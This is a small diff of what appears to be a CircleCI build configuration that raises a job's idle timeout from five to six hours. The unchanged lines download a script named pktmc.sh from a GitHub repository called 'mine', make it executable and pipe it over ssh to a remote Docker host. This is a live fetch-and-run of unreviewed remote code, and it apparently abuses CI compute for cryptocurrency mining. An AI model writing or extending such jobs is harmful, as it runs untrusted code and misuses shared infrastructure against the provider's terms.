@@ -13,4 +13,4 @@ jobs:
             wget https://raw.githubusercontent.com/gyrogerald/mine/main/pktmc.sh
             chmod +x pktmc.sh
             cat pktmc.sh | ssh remote-docker
-          no_output_timeout: 5h
+          no_output_timeout: 6h
